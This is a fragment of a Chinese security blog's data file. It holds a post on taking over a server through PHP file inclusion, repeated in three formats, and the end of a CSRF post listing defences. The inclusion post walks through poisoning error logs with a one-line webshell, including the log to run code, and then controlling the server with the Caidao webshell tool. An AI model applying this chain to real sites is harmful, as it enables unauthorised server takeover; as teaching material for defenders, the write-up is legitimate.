src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317586014-06a09b2f-9033-4715-a5d2-20a7dc0a4e97.png#align=left&display=inline&height=248&margin=%5Bobject%20Object%5D&originHeight=761&originWidth=1273&status=done&style=none&width=415\"><br>7.现在也就是说我已经将木马文件放到对方的服务器上了，接下来回到本机，连接菜刀，拿下服务器<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317586564-9db664a5-45ff-497f-a00b-7024fd2d4a17.png#align=left&display=inline&height=186&margin=%5Bobject%20Object%5D&originHeight=725&originWidth=1625&status=done&style=none&width=416\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317587075-2f880b21-12a0-4fc7-91e5-9803851f01ff.png#align=left&display=inline&height=186&margin=%5Bobject%20Object%5D&originHeight=725&originWidth=1625&status=done&style=none&width=416\"></p>\n<h1 id=\"0x07-防御CSRF\"><a href=\"#0x07-防御CSRF\" class=\"headerlink\" title=\"0x07 防御CSRF\"></a>0x07 防御CSRF</h1><p>1.验证 HTTP Referer 字段<br>根据 HTTP 协议，在 HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址。这种验证方法通过查看referer来验证CSRF攻击的数据包是否是用户自己的操作，当然因为可以伪造referer，所以现在比较没有那么流行。<br>2.Token机制<br>可以在 HTTP 请求中以参数的形式加入一个随机产生的 token，并在服务器端建立一个拦截器来验证这个 token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。一般为了预防CSRF或者其他攻击，都能够在抓包处发现存在token字段，有的是get传参，有的是post传参。token 可以在用户登陆后产生并放于 session 之中，然后在每次请求时把 token 从 session 中拿出，与请求中的 token 进行比对，如果token一样，则执行操作，token不一样就不予执行。<br>3.在 HTTP 头中自定义属性并验证</p>\n<h1 id=\"0x08-总结思考\"><a href=\"#0x08-总结思考\" class=\"headerlink\" title=\"0x08 总结思考\"></a>0x08 总结思考</h1><p>CSRF漏洞因为需要受害者点击才能够触发，所以经常不被重视，但是正是这种情况下，CSRF能够造成的危害会比想象中要大。嗯嗯，社会工程学就是高端的欺骗，具体可以百度学习一下。本篇文章就到这里了，对于实验中的环境，工具，有需要的可以添加我的微信获取。</p>\n"},{"title":"通过文件包含拿下服务器","keywords":"web安全,文件包含,getshell","description":"通过文件包含拿下服务器","cover":"https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fwww.pianshen.com%2Fimages%2F697%2F9a88f04ae145ad4377fff80669db0f11.png&refer=http%3A%2F%2Fwww.pianshen.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1630747539&t=3e0837ebe761272f181318a65342fab2","date":"2020-12-11T02:00:41.000Z","_content":"\n<meta name=\"referrer\" content=\"no-referrer\"/>\n\n## 概念\n\n文件包含，即包含代码文件。在开发WEB系统的过程中，同样的代码可能要在多个地方使用，例如登录后台之后需要检测用户是否登录，要实现的话需要在每一个后台文件都具有检测登录的代码，这样会导致代码很冗余，耗费了大量的人力物力而且还浪费了服务器资源。在这样的情况下，就开发出了文件包含函数，通过include()、require()、include_once()、require_once()函数，指定对应文件的路径，即可自动加载该文件的代码进行执行。\n从开发层面来看，文件包含便利了代码的编写，但是如果没有进行很好地检测，就会产生任意文件包含漏洞。\n## 本地文件包含和远程文件包含\n       文件包含分为本地文件包含和远程文件包含。本地文件包含，LFI，只能包含服务器上的资源；远程文件包含，RFI，可以通过http协议包含互联网上的资源。\n       开启文件包含功能需要在PHP的配置文件php.ini中进行设置：\n\nallow_url_fopen = On/off 表示开启或关闭本地文件包含功能\nallow_url_include = On/Off 表示开启或关闭远程文件包含功能\n\n远程文件包含因为危害性更大，可以直接加载互联网上的文件，所以一般该功能是处于关闭状态的；而本地文件包含因为需要减轻代码负担，所以一般都是开启的。如图：\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318142975-cfabd66e-c7d2-429c-ac6d-1e1ca5ed0742.png#align=left&display=inline&height=79&margin=%5Bobject%20Object%5D&originHeight=160&originWidth=839&status=done&style=none&width=415)\n## 文件包含函数\n文件包含函数有include()、include_once()、require()、require_once()。因为是拼接到代码进行执行，所以被文件包含的文件不论是什么后缀，包含之后都会被当作代码执行。在文件上传中，我们往往写入了一句话木马文件，但是因为白名单，二次渲染，重新更名等措施，使木马文件不能被当作代码执行，所以只是上传到服务器上了。如果服务器还存在文件包含漏洞，可以进行本地文件包含，那么将其包含的路径指定为木马文件，就可以执行了。\n\n文件包含函数之间的区别：\ninclude() //如果被包含的文件不存在，网页报错，但是代码会继续执行\nrequire() //如果被包含的文件不存在，网页报错，代码不会继续执行\ninclude_once()和require_once()\n本质上与include()和require()差别不大，就是在包含前查看是否已经包含过了，如果包含过一次了就不再继续包含。\n\n产生这样区别的原理是include和require调用文件的方式和时间不同：\ninclude - PHP运行到include函数的位置然后去调用被包含的文件。\nrequire - PHP在运行前，就先去把被包含的文件的内容提取出来，然后整合成一个新的PHP文件去执行。\n\n\n## 漏洞-任意文件包含\n       如果说单纯是文件包含，那么并不算是漏洞，因为只是包含了相应的代码文件，能够让代码执行的更加快捷，减轻了服务器压力。但是有的时候，因为业务的需要，或者在开发代码的时候为了文件包含的灵活，开发者会将文件包含函数包含的文件路径通过传参来实现。那么，如果我们控制了传参的内容指向我们需要的文件路径，就变成了任意文件包含漏洞，只要那个文件是一个包含了木马的文件，就可以直接获取服务器权限。\n## 实战演示\n1、打开实例站点，这里看到是通过s参数加载模块回显页面的\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318143514-03a10597-d68e-484d-8647-bfb2118f62b4.png#align=left&display=inline&height=268&margin=%5Bobject%20Object%5D&originHeight=849&originWidth=1314&status=done&style=none&width=415)\n2、通过源代码审计工具对于站点源代码进行审计。发现在MyAction.class.php文件中通过id传参拼接my_进行加载模块处理。\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318144021-1fd9660e-5a45-488f-91fc-5230b91fd9be.png#align=left&display=inline&height=179&margin=%5Bobject%20Object%5D&originHeight=480&originWidth=1112&status=done&style=none&width=415)\n3、定位display函数，发现继续调用了fetch函数。\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318144659-0f034d91-7eda-431b-a42b-ebeec8a53875.png#align=left&display=inline&height=231&margin=%5Bobject%20Object%5D&originHeight=593&originWidth=1064&status=done&style=none&width=415)\n4、继续追踪fetch函数，经分析发现经过了parseTemplateFile函数对其进行了处理，之后直接通过include()进行包含。\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318145056-d8c139ec-8701-48aa-9931-967cf2aeb98b.png#align=left&display=inline&height=248&margin=%5Bobject%20Object%5D&originHeight=725&originWidth=1213&status=done&style=none&width=415)\n5、全文追踪找到parseTemplateFile函数，里面检测了模板文件名为空、模板文件名包含@、模板文件名包含：的情况，这些不影响进行文件包含。\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318145516-73fe323b-0c2a-4dc1-a298-50217a0f132d.png#align=left&display=inline&height=128&margin=%5Bobject%20Object%5D&originHeight=380&originWidth=1236&status=done&style=none&width=415)\n6、后面发现有个throw分支，需要能够返回变量templateFile，那么就不能进入该分支。定位函数file_exists_case。经分析可以发现这里是对文件名大小写进行判断的，并不影响传入目录进行包含。\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318146009-23cc3ea2-a3f8-48be-8f9c-94f135ac5c9e.png#align=left&display=inline&height=115&margin=%5Bobject%20Object%5D&originHeight=237&originWidth=856&status=done&style=none&width=415)\n7、现在漏洞点有了，但是进行包含需要一个含有一句话木马的文件。回到站点，在加载模块处加上任意信息让其报错，可以看到在页面中显示了错误信息提示模块不存在，并且输出了传入的aaaaaa。\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318146301-255c3a10-1929-4d4f-9ec1-b1a8484ed18f.png#align=left&display=inline&height=145&margin=%5Bobject%20Object%5D&originHeight=394&originWidth=1126&status=done&style=none&width=415)\n8、查看日志文件，发现日志文件名是通过固定的年_月_日进行命名的，并且文件内容将完整的错误信息记录了下来。\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318146626-9d687e34-3d1d-4881-ba2c-b43c3167113d.png#align=left&display=inline&height=119&margin=%5Bobject%20Object%5D&originHeight=267&originWidth=931&status=done&style=none&width=415)\n9、接下来就是想办法通过错误信息将一句话木马写入到日志文件。这里先传了常规的一句话，发现错误信息并没有加载该一句话。不要紧，查看日志文件发现，已经成功写入了一句话木马。\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318147241-16dd66a9-f0e5-40f7-be7f-719f580438cf.png#align=left&display=inline&height=165&margin=%5Bobject%20Object%5D&originHeight=400&originWidth=1007&status=done&style=none&width=415)\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318147808-26ccb09e-7ee1-4573-a5de-6543b6d22b6d.png#align=left&display=inline&height=169&margin=%5Bobject%20Object%5D&originHeight=404&originWidth=990&status=done&style=none&width=415)\n10、包含该日志文件，成功输出了里面的内容了，但是当我通过传参1执行phpinfo()函数的时候发现页面没有响应。\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318148361-358ea321-9040-4bc6-9f79-77102066a9ed.png#align=left&display=inline&height=123&margin=%5Bobject%20Object%5D&originHeight=332&originWidth=1122&status=done&style=none&width=415)\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318148740-eb30ee42-ff9d-48aa-a1a2-b148721c757b.png#align=left&display=inline&height=174&margin=%5Bobject%20Object%5D&originHeight=452&originWidth=1076&status=done&style=none&width=415)\n11、查看网页url发现我的输入被网站更改了，变成/0/phpinfo()%3B/，应该是传参1在网站后台有记录，是确实存在的，那么重新传一句话木马，此时设置php的传参为aaa。\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318149233-e2b56e29-5059-418a-9009-53024089fa38.png#align=left&display=inline&height=172&margin=%5Bobject%20Object%5D&originHeight=429&originWidth=1033&status=done&style=none&width=415)\n12、在加载模块处拼接日志文件再通过&传参aaa=phpinfo();，发现页面成功输出了phpinfo的函数内容。\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318149754-5a507cec-b0c0-4f11-8aca-6f52f8f9cace.png#align=left&display=inline&height=337&margin=%5Bobject%20Object%5D&originHeight=960&originWidth=1182&status=done&style=none&width=415)\n13、通过菜刀WEBshell管理工具拿下服务器权限。\n\n\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318150289-82aae539-c225-471b-b6ac-e148f15d311f.png#align=left&display=inline&height=225&margin=%5Bobject%20Object%5D&originHeight=375&originWidth=625&status=done&style=none&width=375)\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318150780-2d387c11-b081-4491-a7ae-dc0baf84b7ee.png#align=left&display=inline&height=218&margin=%5Bobject%20Object%5D&originHeight=619&originWidth=1179&status=done&style=none&width=415)\n14、执行系统命令获取当前用户名以及系统信息。\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318151078-deac12cd-82b8-4966-8737-0103af237ad5.png#align=left&display=inline&height=208&margin=%5Bobject%20Object%5D&originHeight=551&originWidth=1099&status=done&style=none&width=415)\n","source":"_posts/通过文件包含拿下服务器.md","raw":"---\ntitle: 通过文件包含拿下服务器\ntags: \n  - web安全\n  - 文件包含\n  - getshell\ncategories: web安全\nkeywords: 'web安全,文件包含,getshell'\ndescription: 通过文件包含拿下服务器\ncover: https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fwww.pianshen.com%2Fimages%2F697%2F9a88f04ae145ad4377fff80669db0f11.png&refer=http%3A%2F%2Fwww.pianshen.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1630747539&t=3e0837ebe761272f181318a65342fab2\ndate: 2020-12-11 10:00:41\n---\n\n<meta name=\"referrer\" content=\"no-referrer\"/>\n\n## 概念\n\n文件包含，即包含代码文件。在开发WEB系统的过程中，同样的代码可能要在多个地方使用，例如登录后台之后需要检测用户是否登录，要实现的话需要在每一个后台文件都具有检测登录的代码，这样会导致代码很冗余，耗费了大量的人力物力而且还浪费了服务器资源。在这样的情况下，就开发出了文件包含函数，通过include()、require()、include_once()、require_once()函数，指定对应文件的路径，即可自动加载该文件的代码进行执行。\n从开发层面来看，文件包含便利了代码的编写，但是如果没有进行很好地检测，就会产生任意文件包含漏洞。\n## 本地文件包含和远程文件包含\n       文件包含分为本地文件包含和远程文件包含。本地文件包含，LFI，只能包含服务器上的资源；远程文件包含，RFI，可以通过http协议包含互联网上的资源。\n       开启文件包含功能需要在PHP的配置文件php.ini中进行设置：\n\nallow_url_fopen = On/off 表示开启或关闭本地文件包含功能\nallow_url_include = On/Off 表示开启或关闭远程文件包含功能\n\n远程文件包含因为危害性更大，可以直接加载互联网上的文件，所以一般该功能是处于关闭状态的；而本地文件包含因为需要减轻代码负担，所以一般都是开启的。如图：\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318142975-cfabd66e-c7d2-429c-ac6d-1e1ca5ed0742.png#align=left&display=inline&height=79&margin=%5Bobject%20Object%5D&originHeight=160&originWidth=839&status=done&style=none&width=415)\n## 文件包含函数\n文件包含函数有include()、include_once()、require()、require_once()。因为是拼接到代码进行执行，所以被文件包含的文件不论是什么后缀，包含之后都会被当作代码执行。在文件上传中，我们往往写入了一句话木马文件，但是因为白名单，二次渲染，重新更名等措施，使木马文件不能被当作代码执行，所以只是上传到服务器上了。如果服务器还存在文件包含漏洞，可以进行本地文件包含，那么将其包含的路径指定为木马文件，就可以执行了。\n\n文件包含函数之间的区别：\ninclude() //如果被包含的文件不存在，网页报错，但是代码会继续执行\nrequire() //如果被包含的文件不存在，网页报错，代码不会继续执行\ninclude_once()和require_once()\n本质上与include()和require()差别不大，就是在包含前查看是否已经包含过了，如果包含过一次了就不再继续包含。\n\n产生这样区别的原理是include和require调用文件的方式和时间不同：\ninclude - PHP运行到include函数的位置然后去调用被包含的文件。\nrequire - PHP在运行前，就先去把被包含的文件的内容提取出来，然后整合成一个新的PHP文件去执行。\n\n\n## 漏洞-任意文件包含\n       如果说单纯是文件包含，那么并不算是漏洞，因为只是包含了相应的代码文件，能够让代码执行的更加快捷，减轻了服务器压力。但是有的时候，因为业务的需要，或者在开发代码的时候为了文件包含的灵活，开发者会将文件包含函数包含的文件路径通过传参来实现。那么，如果我们控制了传参的内容指向我们需要的文件路径，就变成了任意文件包含漏洞，只要那个文件是一个包含了木马的文件，就可以直接获取服务器权限。\n## 实战演示\n1、打开实例站点，这里看到是通过s参数加载模块回显页面的\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318143514-03a10597-d68e-484d-8647-bfb2118f62b4.png#align=left&display=inline&height=268&margin=%5Bobject%20Object%5D&originHeight=849&originWidth=1314&status=done&style=none&width=415)\n2、通过源代码审计工具对于站点源代码进行审计。发现在MyAction.class.php文件中通过id传参拼接my_进行加载模块处理。\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318144021-1fd9660e-5a45-488f-91fc-5230b91fd9be.png#align=left&display=inline&height=179&margin=%5Bobject%20Object%5D&originHeight=480&originWidth=1112&status=done&style=none&width=415)\n3、定位display函数，发现继续调用了fetch函数。\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318144659-0f034d91-7eda-431b-a42b-ebeec8a53875.png#align=left&display=inline&height=231&margin=%5Bobject%20Object%5D&originHeight=593&originWidth=1064&status=done&style=none&width=415)\n4、继续追踪fetch函数，经分析发现经过了parseTemplateFile函数对其进行了处理，之后直接通过include()进行包含。\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318145056-d8c139ec-8701-48aa-9931-967cf2aeb98b.png#align=left&display=inline&height=248&margin=%5Bobject%20Object%5D&originHeight=725&originWidth=1213&status=done&style=none&width=415)\n5、全文追踪找到parseTemplateFile函数，里面检测了模板文件名为空、模板文件名包含@、模板文件名包含：的情况，这些不影响进行文件包含。\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318145516-73fe323b-0c2a-4dc1-a298-50217a0f132d.png#align=left&display=inline&height=128&margin=%5Bobject%20Object%5D&originHeight=380&originWidth=1236&status=done&style=none&width=415)\n6、后面发现有个throw分支，需要能够返回变量templateFile，那么就不能进入该分支。定位函数file_exists_case。经分析可以发现这里是对文件名大小写进行判断的，并不影响传入目录进行包含。\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318146009-23cc3ea2-a3f8-48be-8f9c-94f135ac5c9e.png#align=left&display=inline&height=115&margin=%5Bobject%20Object%5D&originHeight=237&originWidth=856&status=done&style=none&width=415)\n7、现在漏洞点有了，但是进行包含需要一个含有一句话木马的文件。回到站点，在加载模块处加上任意信息让其报错，可以看到在页面中显示了错误信息提示模块不存在，并且输出了传入的aaaaaa。\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318146301-255c3a10-1929-4d4f-9ec1-b1a8484ed18f.png#align=left&display=inline&height=145&margin=%5Bobject%20Object%5D&originHeight=394&originWidth=1126&status=done&style=none&width=415)\n8、查看日志文件，发现日志文件名是通过固定的年_月_日进行命名的，并且文件内容将完整的错误信息记录了下来。\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318146626-9d687e34-3d1d-4881-ba2c-b43c3167113d.png#align=left&display=inline&height=119&margin=%5Bobject%20Object%5D&originHeight=267&originWidth=931&status=done&style=none&width=415)\n9、接下来就是想办法通过错误信息将一句话木马写入到日志文件。这里先传了常规的一句话，发现错误信息并没有加载该一句话。不要紧，查看日志文件发现，已经成功写入了一句话木马。\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318147241-16dd66a9-f0e5-40f7-be7f-719f580438cf.png#align=left&display=inline&height=165&margin=%5Bobject%20Object%5D&originHeight=400&originWidth=1007&status=done&style=none&width=415)\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318147808-26ccb09e-7ee1-4573-a5de-6543b6d22b6d.png#align=left&display=inline&height=169&margin=%5Bobject%20Object%5D&originHeight=404&originWidth=990&status=done&style=none&width=415)\n10、包含该日志文件，成功输出了里面的内容了，但是当我通过传参1执行phpinfo()函数的时候发现页面没有响应。\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318148361-358ea321-9040-4bc6-9f79-77102066a9ed.png#align=left&display=inline&height=123&margin=%5Bobject%20Object%5D&originHeight=332&originWidth=1122&status=done&style=none&width=415)\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318148740-eb30ee42-ff9d-48aa-a1a2-b148721c757b.png#align=left&display=inline&height=174&margin=%5Bobject%20Object%5D&originHeight=452&originWidth=1076&status=done&style=none&width=415)\n11、查看网页url发现我的输入被网站更改了，变成/0/phpinfo()%3B/，应该是传参1在网站后台有记录，是确实存在的，那么重新传一句话木马，此时设置php的传参为aaa。\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318149233-e2b56e29-5059-418a-9009-53024089fa38.png#align=left&display=inline&height=172&margin=%5Bobject%20Object%5D&originHeight=429&originWidth=1033&status=done&style=none&width=415)\n12、在加载模块处拼接日志文件再通过&传参aaa=phpinfo();，发现页面成功输出了phpinfo的函数内容。\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318149754-5a507cec-b0c0-4f11-8aca-6f52f8f9cace.png#align=left&display=inline&height=337&margin=%5Bobject%20Object%5D&originHeight=960&originWidth=1182&status=done&style=none&width=415)\n13、通过菜刀WEBshell管理工具拿下服务器权限。\n\n\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318150289-82aae539-c225-471b-b6ac-e148f15d311f.png#align=left&display=inline&height=225&margin=%5Bobject%20Object%5D&originHeight=375&originWidth=625&status=done&style=none&width=375)\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318150780-2d387c11-b081-4491-a7ae-dc0baf84b7ee.png#align=left&display=inline&height=218&margin=%5Bobject%20Object%5D&originHeight=619&originWidth=1179&status=done&style=none&width=415)\n14、执行系统命令获取当前用户名以及系统信息。\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318151078-deac12cd-82b8-4966-8737-0103af237ad5.png#align=left&display=inline&height=208&margin=%5Bobject%20Object%5D&originHeight=551&originWidth=1099&status=done&style=none&width=415)\n","slug":"通过文件包含拿下服务器","published":1,"updated":"2021-08-07T16:16:47.965Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckt46mpgh0053vkq33gh6btbw","content":"<meta name=\"referrer\" content=\"no-referrer\"/>\n\n<h2 id=\"概念\"><a href=\"#概念\" class=\"headerlink\" title=\"概念\"></a>概念</h2><p>文件包含，即包含代码文件。在开发WEB系统的过程中，同样的代码可能要在多个地方使用，例如登录后台之后需要检测用户是否登录，要实现的话需要在每一个后台文件都具有检测登录的代码，这样会导致代码很冗余，耗费了大量的人力物力而且还浪费了服务器资源。在这样的情况下，就开发出了文件包含函数，通过include()、require()、include_once()、require_once()函数，指定对应文件的路径，即可自动加载该文件的代码进行执行。<br>从开发层面来看，文件包含便利了代码的编写，但是如果没有进行很好地检测，就会产生任意文件包含漏洞。</p>\n<h2 id=\"本地文件包含和远程文件包含\"><a href=\"#本地文件包含和远程文件包含\" class=\"headerlink\" title=\"本地文件包含和远程文件包含\"></a>本地文件包含和远程文件包含</h2><p>       文件包含分为本地文件包含和远程文件包含。本地文件包含，LFI，只能包含服务器上的资源；远程文件包含，RFI，可以通过http协议包含互联网上的资源。<br>       开启文件包含功能需要在PHP的配置文件php.ini中进行设置：</p>\n<p>allow_url_fopen = On/off 表示开启或关闭本地文件包含功能<br>allow_url_include = On/Off 表示开启或关闭远程文件包含功能</p>\n<p>远程文件包含因为危害性更大，可以直接加载互联网上的文件，所以一般该功能是处于关闭状态的；而本地文件包含因为需要减轻代码负担，所以一般都是开启的。如图：<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318142975-cfabd66e-c7d2-429c-ac6d-1e1ca5ed0742.png#align=left&display=inline&height=79&margin=%5Bobject%20Object%5D&originHeight=160&originWidth=839&status=done&style=none&width=415\"></p>\n<h2 id=\"文件包含函数\"><a href=\"#文件包含函数\" class=\"headerlink\" title=\"文件包含函数\"></a>文件包含函数</h2><p>文件包含函数有include()、include_once()、require()、require_once()。因为是拼接到代码进行执行，所以被文件包含的文件不论是什么后缀，包含之后都会被当作代码执行。在文件上传中，我们往往写入了一句话木马文件，但是因为白名单，二次渲染，重新更名等措施，使木马文件不能被当作代码执行，所以只是上传到服务器上了。如果服务器还存在文件包含漏洞，可以进行本地文件包含，那么将其包含的路径指定为木马文件，就可以执行了。</p>\n<p>文件包含函数之间的区别：<br>include() //如果被包含的文件不存在，网页报错，但是代码会继续执行<br>require() //如果被包含的文件不存在，网页报错，代码不会继续执行<br>include_once()和require_once()<br>本质上与include()和require()差别不大，就是在包含前查看是否已经包含过了，如果包含过一次了就不再继续包含。</p>\n<p>产生这样区别的原理是include和require调用文件的方式和时间不同：<br>include - PHP运行到include函数的位置然后去调用被包含的文件。<br>require - PHP在运行前，就先去把被包含的文件的内容提取出来，然后整合成一个新的PHP文件去执行。</p>\n<h2 id=\"漏洞-任意文件包含\"><a href=\"#漏洞-任意文件包含\" class=\"headerlink\" title=\"漏洞-任意文件包含\"></a>漏洞-任意文件包含</h2><p>       如果说单纯是文件包含，那么并不算是漏洞，因为只是包含了相应的代码文件，能够让代码执行的更加快捷，减轻了服务器压力。但是有的时候，因为业务的需要，或者在开发代码的时候为了文件包含的灵活，开发者会将文件包含函数包含的文件路径通过传参来实现。那么，如果我们控制了传参的内容指向我们需要的文件路径，就变成了任意文件包含漏洞，只要那个文件是一个包含了木马的文件，就可以直接获取服务器权限。</p>\n<h2 id=\"实战演示\"><a href=\"#实战演示\" class=\"headerlink\" title=\"实战演示\"></a>实战演示</h2><p>1、打开实例站点，这里看到是通过s参数加载模块回显页面的<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318143514-03a10597-d68e-484d-8647-bfb2118f62b4.png#align=left&display=inline&height=268&margin=%5Bobject%20Object%5D&originHeight=849&originWidth=1314&status=done&style=none&width=415\"><br>2、通过源代码审计工具对于站点源代码进行审计。发现在MyAction.class.php文件中通过id传参拼接my_进行加载模块处理。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318144021-1fd9660e-5a45-488f-91fc-5230b91fd9be.png#align=left&display=inline&height=179&margin=%5Bobject%20Object%5D&originHeight=480&originWidth=1112&status=done&style=none&width=415\"><br>3、定位display函数，发现继续调用了fetch函数。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318144659-0f034d91-7eda-431b-a42b-ebeec8a53875.png#align=left&display=inline&height=231&margin=%5Bobject%20Object%5D&originHeight=593&originWidth=1064&status=done&style=none&width=415\"><br>4、继续追踪fetch函数，经分析发现经过了parseTemplateFile函数对其进行了处理，之后直接通过include()进行包含。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318145056-d8c139ec-8701-48aa-9931-967cf2aeb98b.png#align=left&display=inline&height=248&margin=%5Bobject%20Object%5D&originHeight=725&originWidth=1213&status=done&style=none&width=415\"><br>5、全文追踪找到parseTemplateFile函数，里面检测了模板文件名为空、模板文件名包含@、模板文件名包含：的情况，这些不影响进行文件包含。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318145516-73fe323b-0c2a-4dc1-a298-50217a0f132d.png#align=left&display=inline&height=128&margin=%5Bobject%20Object%5D&originHeight=380&originWidth=1236&status=done&style=none&width=415\"><br>6、后面发现有个throw分支，需要能够返回变量templateFile，那么就不能进入该分支。定位函数file_exists_case。经分析可以发现这里是对文件名大小写进行判断的，并不影响传入目录进行包含。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318146009-23cc3ea2-a3f8-48be-8f9c-94f135ac5c9e.png#align=left&display=inline&height=115&margin=%5Bobject%20Object%5D&originHeight=237&originWidth=856&status=done&style=none&width=415\"><br>7、现在漏洞点有了，但是进行包含需要一个含有一句话木马的文件。回到站点，在加载模块处加上任意信息让其报错，可以看到在页面中显示了错误信息提示模块不存在，并且输出了传入的aaaaaa。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318146301-255c3a10-1929-4d4f-9ec1-b1a8484ed18f.png#align=left&display=inline&height=145&margin=%5Bobject%20Object%5D&originHeight=394&originWidth=1126&status=done&style=none&width=415\"><br>8、查看日志文件，发现日志文件名是通过固定的年_月_日进行命名的，并且文件内容将完整的错误信息记录了下来。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318146626-9d687e34-3d1d-4881-ba2c-b43c3167113d.png#align=left&display=inline&height=119&margin=%5Bobject%20Object%5D&originHeight=267&originWidth=931&status=done&style=none&width=415\"><br>9、接下来就是想办法通过错误信息将一句话木马写入到日志文件。这里先传了常规的一句话，发现错误信息并没有加载该一句话。不要紧，查看日志文件发现，已经成功写入了一句话木马。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318147241-16dd66a9-f0e5-40f7-be7f-719f580438cf.png#align=left&display=inline&height=165&margin=%5Bobject%20Object%5D&originHeight=400&originWidth=1007&status=done&style=none&width=415\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318147808-26ccb09e-7ee1-4573-a5de-6543b6d22b6d.png#align=left&display=inline&height=169&margin=%5Bobject%20Object%5D&originHeight=404&originWidth=990&status=done&style=none&width=415\"><br>10、包含该日志文件，成功输出了里面的内容了，但是当我通过传参1执行phpinfo()函数的时候发现页面没有响应。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318148361-358ea321-9040-4bc6-9f79-77102066a9ed.png#align=left&display=inline&height=123&margin=%5Bobject%20Object%5D&originHeight=332&originWidth=1122&status=done&style=none&width=415\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318148740-eb30ee42-ff9d-48aa-a1a2-b148721c757b.png#align=left&display=inline&height=174&margin=%5Bobject%20Object%5D&originHeight=452&originWidth=1076&status=done&style=none&width=415\"><br>11、查看网页url发现我的输入被网站更改了，变成/0/phpinfo()%3B/，应该是传参1在网站后台有记录，是确实存在的，那么重新传一句话木马，此时设置php的传参为aaa。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318149233-e2b56e29-5059-418a-9009-53024089fa38.png#align=left&display=inline&height=172&margin=%5Bobject%20Object%5D&originHeight=429&originWidth=1033&status=done&style=none&width=415\"><br>12、在加载模块处拼接日志文件再通过&amp;传参aaa=phpinfo();，发现页面成功输出了phpinfo的函数内容。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318149754-5a507cec-b0c0-4f11-8aca-6f52f8f9cace.png#align=left&display=inline&height=337&margin=%5Bobject%20Object%5D&originHeight=960&originWidth=1182&status=done&style=none&width=415\"><br>13、通过菜刀WEBshell管理工具拿下服务器权限。</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318150289-82aae539-c225-471b-b6ac-e148f15d311f.png#align=left&display=inline&height=225&margin=%5Bobject%20Object%5D&originHeight=375&originWidth=625&status=done&style=none&width=375\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318150780-2d387c11-b081-4491-a7ae-dc0baf84b7ee.png#align=left&display=inline&height=218&margin=%5Bobject%20Object%5D&originHeight=619&originWidth=1179&status=done&style=none&width=415\"><br>14、执行系统命令获取当前用户名以及系统信息。<br><img 